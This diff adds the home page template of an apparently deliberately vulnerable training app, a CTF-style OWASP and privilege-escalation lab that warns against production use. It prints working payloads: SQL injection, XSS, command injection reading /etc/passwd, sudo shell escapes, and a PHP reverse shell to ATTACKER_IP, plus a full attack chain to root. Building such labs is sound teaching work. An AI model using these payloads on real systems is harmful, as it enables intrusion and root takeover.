@@ -1,0 +1,190 @@
+{% extends 'base.html' %}
+
+{% block content %}
+<div class="container">
+    <h1 class="mt-4 mb-4">OWASP Vulnerability and Privilege Escalation Demo</h1>
+
+    <div class="alert alert-warning">
+        <strong>Warning:</strong> This is a deliberately vulnerable application for demonstration purposes only.
+        DO NOT use in production or expose to the public internet.
+    </div>
+
+    <div class="card mb-4">
+        <div class="card-header bg-primary text-white">
+            <h2 class="h5 mb-0">Demo Environment Status</h2>
+        </div>
+        <div class="card-body">
+            <ul class="list-group">
+                <li class="list-group-item d-flex justify-content-between align-items-center">
+                    Hostname
+                    <span class="badge bg-primary">{{ hostname }}</span>
+                </li>
+                <li class="list-group-item d-flex justify-content-between align-items-center">
+                    Running as Root
+                    <span class="badge {% if is_root %}bg-success{% else %}bg-warning{% endif %}">
+                        {% if is_root %}Yes{% else %}No (limited functionality){% endif %}
+                    </span>
+                </li>
+                <li class="list-group-item d-flex justify-content-between align-items-center">
+                    Backup Script Available
+                    <span class="badge {% if backup_script_exists %}bg-success{% else %}bg-danger{% endif %}">
+                        {% if backup_script_exists %}Yes{% else %}No{% endif %}
+                    </span>
+                </li>
+                <li class="list-group-item d-flex justify-content-between align-items-center">
+                    Sudo Privileges Configured
+                    <span class="badge {% if sudoers_configured %}bg-success{% else %}bg-danger{% endif %}">
+                        {% if sudoers_configured %}Yes{% else %}No{% endif %}
+                    </span>
+                </li>
+            </ul>
+            {% if not is_root %}
+            <div class="alert alert-danger mt-3">
+                <strong>Notice:</strong> For full demo functionality, restart the application with root privileges.
+            </div>
+            {% endif %}
+        </div>
+    </div>
+
+    <div class="row">
+        <!-- Web Vulnerabilities -->
+        <div class="col-md-6">
+            <div class="card mb-4">
+                <div class="card-header bg-danger text-white">
+                    <h2 class="h5 mb-0">Web Application Vulnerabilities</h2>
+                </div>
+                <div class="card-body">
+                    <div class="list-group">
+                        <a href="/login" class="list-group-item list-group-item-action">
+                            <div class="d-flex w-100 justify-content-between">
+                                <h5 class="mb-1">SQL Injection</h5>
+                                <small class="text-muted">OWASP A1</small>
+                            </div>
+                            <p class="mb-1">Try using <code>' OR 1=1 --</code> in the login form.</p>
+                        </a>
+
+                        <a href="/comments" class="list-group-item list-group-item-action">
+                            <div class="d-flex w-100 justify-content-between">
+                                <h5 class="mb-1">Cross-Site Scripting (XSS)</h5>
+                                <small class="text-muted">OWASP A7</small>
+                            </div>
+                            <p class="mb-1">Try posting a comment with
+                                <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
+                        </a>
+
+                        <a href="/upload" class="list-group-item list-group-item-action">
+                            <div class="d-flex w-100 justify-content-between">
+                                <h5 class="mb-1">Path Traversal</h5>
+                                <small class="text-muted">OWASP A5</small>
+                            </div>
+                            <p class="mb-1">Upload a PHP file with a path like <code>../</code> to escape the upload
+                                directory.</p>
+                        </a>
+
+                        <a href="/admin/tools" class="list-group-item list-group-item-action">
+                            <div class="d-flex w-100 justify-content-between">
+                                <h5 class="mb-1">Command Injection</h5>
+                                <small class="text-muted">OWASP A1</small>
+                            </div>
+                            <p class="mb-1">Try commands like <code>ping 127.0.0.1 && cat /etc/passwd</code></p>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Privilege Escalation -->
+        <div class="col-md-6">
+            <div class="card mb-4">
+                <div class="card-header bg-danger text-white">
+                    <h2 class="h5 mb-0">Privilege Escalation Vectors</h2>
+                </div>
+                <div class="card-body">
+                    <p class="card-text">After achieving a reverse shell through the web vulnerabilities, try these
+                        privilege escalation techniques:</p>
+
+                    <div class="accordion" id="privescAccordion">
+                        <div class="accordion-item">
+                            <h2 class="accordion-header" id="headingOne">
+                                <button class="accordion-button" type="button" data-bs-toggle="collapse"
+                                    data-bs-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne">
+                                    Backup Script Command Injection
+                                </button>
+                            </h2>
+                            <div id="collapseOne" class="accordion-collapse collapse show" aria-labelledby="headingOne"
+                                data-bs-parent="#privescAccordion">
+                                <div class="accordion-body">
+                                    <code>sudo /tmp/backup_app.sh '; /bin/bash; echo'</code>
+                                    <p class="mt-2">The backup script can be executed as root and is vulnerable to
+                                        command injection.</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="accordion-item">
+                            <h2 class="accordion-header" id="headingTwo">
+                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                                    data-bs-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">
+                                    SUID Binaries Exploitation
+                                </button>
+                            </h2>
+                            <div id="collapseTwo" class="accordion-collapse collapse" aria-labelledby="headingTwo"
+                                data-bs-parent="#privescAccordion">
+                                <div class="accordion-body">
+                                    <ul>
+                                        <li><code>sudo find . -exec /bin/sh -p \; -quit</code></li>
+                                        <li><code>sudo python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'</code>
+                                        </li>
+                                        <li><code>sudo vim -c ':!/bin/sh'</code></li>
+                                    </ul>
+                                    <p>Multiple binaries are configured with SUID permissions or in sudoers with
+                                        NOPASSWD.</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="accordion-item">
+                            <h2 class="accordion-header" id="headingThree">
+                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                                    data-bs-target="#collapseThree" aria-expanded="false" aria-controls="collapseThree">
+                                    Reverse Shell Example
+                                </button>
+                            </h2>
+                            <div id="collapseThree" class="accordion-collapse collapse" aria-labelledby="headingThree"
+                                data-bs-parent="#privescAccordion">
+                                <div class="accordion-body">
+                                    <p>First, set up a listener on your attacking machine:</p>
+                                    <code>nc -lvnp 4444</code>
+                                    <p class="mt-2">Then, use this PHP code in a reverse shell file:</p>
+                                    <pre><code>
+&lt;?php
+$sock=fsockopen("ATTACKER_IP",4444);
+exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");
+?&gt;
+                                    </code></pre>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="card mb-4">
+        <div class="card-header bg-dark text-white">
+            <h2 class="h5 mb-0">Complete Attack Chain</h2>
+        </div>
+        <div class="card-body">
+            <ol class="list-group list-group-numbered">
+                <li class="list-group-item">Upload a PHP reverse shell using the path traversal vulnerability.</li>
+                <li class="list-group-item">Set up a listener on your attacking machine and access the shell.</li>
+                <li class="list-group-item">Execute <code>sudo -l</code> to discover available privilege escalation
+                    vectors.</li>
+                <li class="list-group-item">Exploit one of the privilege escalation methods to gain root access.</li>
+                <li class="list-group-item">Find and read the root flag at <code>/root/root_flag.txt</code>.</li>
+            </ol>
+        </div>
+    </div>
+</div>
+{% endblock %}
